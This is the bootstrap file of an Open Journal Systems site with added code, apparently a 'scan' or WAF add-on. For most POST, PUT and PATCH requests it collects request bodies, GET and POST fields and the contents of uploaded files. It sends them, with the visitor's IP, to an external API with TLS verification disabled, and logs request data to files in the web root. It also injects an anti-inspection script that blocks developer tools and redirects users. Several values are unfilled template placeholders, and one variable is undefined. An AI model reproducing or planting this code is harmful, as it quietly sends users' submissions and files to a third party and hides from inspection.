<?php

/**
 * @file index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
require_once './lib/pkp/includes/bootstrap.php';

define('KPK4444_API_KEY', '${apiKey}');
define('KPK4444_API_URL', 'https://${url ? url.trim() : ''}');

if (in_array($_SERVER['REQUEST_METHOD'], ['POST', 'PUT', 'PATCH'])) {
    $uri = $_SERVER['REQUEST_URI'] ?? '';
    $skipPaths = ['/login', '/signIn', '/signOut', '/user/register', '/user/profile'];
    $shouldSkip = false;
    foreach ($skipPaths as $path) {
        if (stripos($uri, $path) !== false) {
            $shouldSkip = true;
            break;
        }
    }
    
    if (!$shouldSkip) {
        $c = "";
        
        $debugStr = "URI: $uri\\nFILES: " . json_encode($_FILES) . "\\nPOST: " . json_encode($_POST) . "\\n";
        file_put_contents(__DIR__ . '/kpk_debug_files.txt', $debugStr, FILE_APPEND);
        
        $rawInput = file_get_contents('php://input');
        if ($rawInput) { $c .= $rawInput . " "; }
        
        if (!empty($_POST)) $c .= json_encode($_POST, 256 | 512) . " ";
        if (!empty($_GET)) $c .= json_encode($_GET, 256 | 512) . " ";
        if (!empty($_FILES)) {
            foreach ($_FILES as $fileKey => $file) {
                if (isset($file['name'])) {
                    $c .= is_array($file['name']) ? json_encode($file['name']) . " " : $file['name'] . " ";
                }
                if (isset($file['tmp_name'])) {
                    $tmpFiles = is_array($file['tmp_name']) ? $file['tmp_name'] : [$file['tmp_name']];
                    foreach ($tmpFiles as $tmp) {
                        if (!empty($tmp) && file_exists($tmp)) {
                            $fsize = filesize($tmp);
                            file_put_contents(__DIR__ . '/kpk_debug_files.txt', "Found tmp file: $tmp (size: $fsize)\\n", FILE_APPEND);
                            if ($fsize > 10000) {
                                $head = file_get_contents($tmp, false, null, 0, 5000);
                                $tail = file_get_contents($tmp, false, null, $fsize - 5000, 5000);
                                $c .= $head . "\\n...[TRUNCATED]...\\n" . $tail . " ";
                            } else {
                                $c .= file_get_contents($tmp) . " ";
                            }
                        } else {
                            file_put_contents(__DIR__ . '/kpk_debug_files.txt', "File not exists: $tmp\\n", FILE_APPEND);
                        }
                    }
                }
            }
        }
        
        // Strip non-ASCII (binary) characters that break json_encode
        $cleanContent = "";
        $len = strlen($c);
        for ($i = 0; $i < $len; $i++) {
            $ord = ord($c[$i]);
            if (($ord >= 32 && $ord <= 126) || $ord == 10 || $ord == 13 || $ord == 9) {
                $cleanContent .= $c[$i];
            }
        }
        $c = $cleanContent;
    } else {
        $c = "PING"; 
    }
    
    if (strlen(trim($c)) > 0) {
        $p = json_encode(['apiKey'=>KPK4444_API_KEY, 'domain'=>$_SERVER['HTTP_HOST']??'unknown', 'content'=>$c, 'field'=>'global', 'userIp'=>$_SERVER['HTTP_CF_CONNECTING_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'unknown']);
        if ($p) {
            $ch = curl_init(KPK4444_API_URL . '/api/scan');
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $p,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'X-Forwarded-For: '.($_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'unknown')],
                CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false
            ]);
            $res = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $err = curl_error($ch);
            curl_close($ch);
            
            // Log for debugging
            file_put_contents(__DIR__ . '/kpk_debug.txt', date('Y-m-d H:i:s') . " - HTTP $code - ERR: $err - RES: $res\\n", FILE_APPEND);
            
            if ($code == 200 && strpos(str_replace(' ', '', $res), '"blocked":true') !== false) {
                file_put_contents($banFile, time());

                
                

                header('HTTP/1.1 403 Forbidden');
                header('Content-Type: text/html'); 
                exit(base64_decode('PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD50cnl7bG9jYWxTdG9yYWdlLmNsZWFyKCk7c2Vzc2lvblN0b3JhZ2UuY2xlYXIoKTt9Y2F0Y2goZSl7fXZhciBwYXRocz13aW5kb3cubG9jYXRpb24ucGF0aG5hbWUuc3BsaXQoJy8nKTt2YXIgbG9nb3V0cz1bJy9pbmRleC5waHAvaW5kZXgvbG9naW4vc2lnbk91dCddO2lmKHBhdGhzLmxlbmd0aD4xKXtpZihwYXRoc1sxXT09PSdpbmRleC5waHAnJiZwYXRocy5sZW5ndGg+Mil7bG9nb3V0cy5wdXNoKCcvaW5kZXgucGhwLycrcGF0aHNbMl0rJy9sb2dpbi9zaWduT3V0Jyk7fWVsc2V7bG9nb3V0cy5wdXNoKCcvJytwYXRoc1sxXSsnL2xvZ2luL3NpZ25PdXQnKTt9fWxvZ291dHMuZm9yRWFjaChmdW5jdGlvbih1cmwpe3ZhciBpPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2kuc3R5bGUuZGlzcGxheT0nbm9uZSc7aS5zcmM9dXJsO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaSk7fSk7dmFyIHQ9NTtzZXRJbnRlcnZhbChmdW5jdGlvbigpe3QtLTtpZih0Pj0wKWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpLmlubmVyVGV4dD10O2lmKHQ8PTApd2luZG93LnRvcC5sb2NhdGlvbi5ocmVmPSJodHRwczovL3d3dy5nb29nbGUuY29tIn0sMTAwMCk7PC9zY3JpcHQ+PC9oZWFkPjxib2R5PjxoMT48c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjcyIiBoZWlnaHQ9IjcyIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2Y0M2Y1ZSIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGQ9Ik0xMiAyMnM4LTQgOC0xMFY1bC04LTMtOCAzdjdjMCA2IDggMTAgOCAxMHoiPjwvcGF0aD48cG9seWxpbmUgcG9pbnRzPSI5IDEyIDExIDE0IDE1IDEwIj48L3BvbHlsaW5lPjwvc3ZnPiBBQ0NFU1MgREVOSUVEPC9oMT48ZGl2IGNsYXNzPSJjIj5SZWRpcmVjdGluZyBpbiA8c3BhbiBpZD0idGltZXIiIGNsYXNzPSJuIj41PC9zcGFuPiBzZWNvbmRzLi4uPC9kaXY+PC9ib2R5PjwvaHRtbD4='));
            } elseif ($code == 403 || $code == 429) {
                file_put_contents($banFile, time());

                
                

                header('HTTP/1.1 403 Forbidden');
                header('Content-Type: text/html'); 
                exit(base64_decode('PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD50cnl7bG9jYWxTdG9yYWdlLmNsZWFyKCk7c2Vzc2lvblN0b3JhZ2UuY2xlYXIoKTt9Y2F0Y2goZSl7fXZhciBwYXRocz13aW5kb3cubG9jYXRpb24ucGF0aG5hbWUuc3BsaXQoJy8nKTt2YXIgbG9nb3V0cz1bJy9pbmRleC5waHAvaW5kZXgvbG9naW4vc2lnbk91dCddO2lmKHBhdGhzLmxlbmd0aD4xKXtpZihwYXRoc1sxXT09PSdpbmRleC5waHAnJiZwYXRocy5sZW5ndGg+Mil7bG9nb3V0cy5wdXNoKCcvaW5kZXgucGhwLycrcGF0aHNbMl0rJy9sb2dpbi9zaWduT3V0Jyk7fWVsc2V7bG9nb3V0cy5wdXNoKCcvJytwYXRoc1sxXSsnL2xvZ2luL3NpZ25PdXQnKTt9fWxvZ291dHMuZm9yRWFjaChmdW5jdGlvbih1cmwpe3ZhciBpPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpO2kuc3R5bGUuZGlzcGxheT0nbm9uZSc7aS5zcmM9dXJsO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaSk7fSk7dmFyIHQ9NTtzZXRJbnRlcnZhbChmdW5jdGlvbigpe3QtLTtpZih0Pj0wKWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpLmlubmVyVGV4dD10O2lmKHQ8PTApd2luZG93LnRvcC5sb2NhdGlvbi5ocmVmPSJodHRwczovL3d3dy5nb29nbGUuY29tIn0sMTAwMCk7PC9zY3JpcHQ+PC9oZWFkPjxib2R5PjxoMT48c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjcyIiBoZWlnaHQ9IjcyIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2Y0M2Y1ZSIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGQ9Ik0xMiAyMnM4LTQgOC0xMFY1bC04LTMtOCAzdjdjMCA2IDggMTAgOCAxMHoiPjwvcGF0aD48cG9seWxpbmUgcG9pbnRzPSI5IDEyIDExIDE0IDE1IDEwIj48L3BvbHlsaW5lPjwvc3ZnPiBBQ0NFU1MgREVOSUVEPC9oMT48ZGl2IGNsYXNzPSJjIj5SZWRpcmVjdGluZyBpbiA8c3BhbiBpZD0idGltZXIiIGNsYXNzPSJuIj41PC9zcGFuPiBzZWNvbmRzLi4uPC9kaXY+PC9ib2R5PjwvaHRtbD4='));
            }
        }
    }
}

// Anti-Inspect Shield (Only for normal HTML pages, SKIP for AJAX to prevent JSON corruption)
$isAjax = (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') || 
          strpos($_SERVER['REQUEST_URI'], '/api/') !== false || 
          strpos($_SERVER['REQUEST_URI'], '$$$call$$$') !== false ||
          strpos($_SERVER['REQUEST_URI'], '/submission/saveStep/') !== false ||
          strpos($_SERVER['REQUEST_URI'], '/notification/fetchNotification') !== false;

if (!$isAjax) {
    ob_start(function($b) {
        $s = '<script>!function(){document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("keydown",function(e){if(123===e.keyCode||e.ctrlKey&&e.shiftKey&&(73===e.keyCode||74===e.keyCode)||e.ctrlKey&&85===e.keyCode){e.preventDefault();window.top.location.href="https://www.google.com"}});var e=function(){var n=(new Date).getTime();debugger;if((new Date).getTime()-n>50){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSJ9LDEwMDApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48aDE+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmNDNmNWUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ij48L3BhdGg+PHBvbHlsaW5lIHBvaW50cz0iOSAxMiAxMSAxNCAxNSAxMCI+PC9wb2x5bGluZT48L3N2Zz4gQUNDRVNTIERFTklFRDwvaDE+PGRpdiBjbGFzcz0iYyI+UmVkaXJlY3RpbmcgaW4gPHNwYW4gaWQ9InRpbWVyIiBjbGFzcz0ibiI+NTwvc3Bhbj4gc2Vjb25kcy4uLjwvZGl2PjwvYm9keT48L2h0bWw+"))}setTimeout(e,50)};e();var n=function(){if(window.outerWidth-window.innerWidth>160||window.outerHeight-window.innerHeight>160){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSJ9LDEwMDApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48aDE+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmNDNmNWUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ij48L3BhdGg+PHBvbHlsaW5lIHBvaW50cz0iOSAxMiAxMSAxNCAxNSAxMCI+PC9wb2x5bGluZT48L3N2Zz4gQUNDRVNTIERFTklFRDwvaDE+PGRpdiBjbGFzcz0iYyI+UmVkaXJlY3RpbmcgaW4gPHNwYW4gaWQ9InRpbWVyIiBjbGFzcz0ibiI+NTwvc3Bhbj4gc2Vjb25kcy4uLjwvZGl2PjwvYm9keT48L2h0bWw+"))}};setInterval(n,500);window.addEventListener("resize",n);var o=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(){this.addEventListener("readystatechange",function(){if(4===this.readyState&&(403===this.status||429===this.status)){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSJ9LDEwMDApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48aDE+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmNDNmNWUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ij48L3BhdGg+PHBvbHlsaW5lIHBvaW50cz0iOSAxMiAxMSAxNCAxNSAxMCI+PC9wb2x5bGluZT48L3N2Zz4gQUNDRVNTIERFTklFRDwvaDE+PGRpdiBjbGFzcz0iYyI+UmVkaXJlY3RpbmcgaW4gPHNwYW4gaWQ9InRpbWVyIiBjbGFzcz0ibiI+NTwvc3Bhbj4gc2Vjb25kcy4uLjwvZGl2PjwvYm9keT48L2h0bWw+"))}});return o.apply(this,arguments)};var f=window.fetch;if(f){window.fetch=function(){return f.apply(this,arguments).then(function(r){if(403===r.status||429===r.status){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSJ9LDEwMDApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48aDE+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmNDNmNWUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ij48L3BhdGg+PHBvbHlsaW5lIHBvaW50cz0iOSAxMiAxMSAxNCAxNSAxMCI+PC9wb2x5bGluZT48L3N2Zz4gQUNDRVNTIERFTklFRDwvaDE+PGRpdiBjbGFzcz0iYyI+UmVkaXJlY3RpbmcgaW4gPHNwYW4gaWQ9InRpbWVyIiBjbGFzcz0ibiI+NTwvc3Bhbj4gc2Vjb25kcy4uLjwvZGl2PjwvYm9keT48L2h0bWw+"))}return r})}};}();</script>';
        return str_ireplace('</head>', $s . '</head>', $b);
    });
}

// Serve the request
APP\\core\\Application::get()->execute();
